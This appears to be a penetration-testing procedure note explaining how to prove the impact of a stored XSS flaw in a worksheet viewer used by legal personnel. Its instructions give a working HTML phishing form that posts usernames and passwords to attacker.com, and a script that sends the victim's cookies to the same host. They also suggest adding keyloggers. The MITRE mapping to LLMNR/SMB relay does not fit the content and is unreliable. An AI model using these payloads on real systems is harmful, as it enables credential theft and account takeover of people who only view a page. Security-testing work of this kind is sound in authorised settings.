---
id: proc-uuid-005
tags:
  - impact-demo
  - credential-theft
  - phishing
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[LLMNR-NBT-NS Poisoning and SMB Relay]]'
updated_at: '2025-12-14T03:16:36.848Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[LLMNR-NBT-NS Poisoning and SMB Relay]]'
---
# Demonstrate-XSS-Impact-with-Payloads

## Summary

This procedure demonstrates the real-world impacts of the stored XSS by deploying specific payloads for credential theft, account takeover, and data exfiltration in the DoD worksheet viewer context.

## Description

To prove severity, payloads simulate phishing (fake logins), cookie theft (redirects), and other attacks like keystroke logging. Execution occurs when legal personnel view worksheets, running JS with their privileges. In testing, use controlled servers to capture data. Prerequisites: Triggered XSS; outcomes: Proof of compromise potential, e.g., captured creds sent to attacker.

## Requirements

1. Attacker server endpoint (e.g., http://attacker.com/steal)
2. Advanced payloads for specific vectors
3. Monitoring tools to verify exfiltration

## Defense

Defensive measures and detection strategies:

- Train users on phishing recognition in trusted apps
- Monitor for outbound requests from app domains to unknown hosts
- Implement multi-factor authentication (MFA) to mitigate stolen creds

## Objectives

1. Execute phishing for credential capture
2. Exfiltrate session data (cookies)
3. Highlight escalation to account takeover

## Instructions

### Step 1: Deploy Phishing Payload

**Context**: Capture logins.

Inject: <h3>Please login to proceed</h3><form action="http://attacker.com/steal">Username:<input type="text" name="username">Password:<input type="password" name="password"><input type="submit" value="Logon"></form>

> On trigger, form appears. Expected output: Submitted creds to server.

### Step 2: Test Cookie Exfiltration

**Context**: Steal session.

Use: <script>window.location="http://attacker.com/?cookie=" + document.cookie</script>

> Redirects with data. Expected output: Cookies logged on attacker site.

### Step 3: Extend to Other Impacts

**Context**: Show broader risks.

Add keylogger or download scripts.

> Demonstrates takeover. Expected output: Full compromise simulation.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[LLMNR-NBT-NS Poisoning and SMB Relay]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[exfil]]
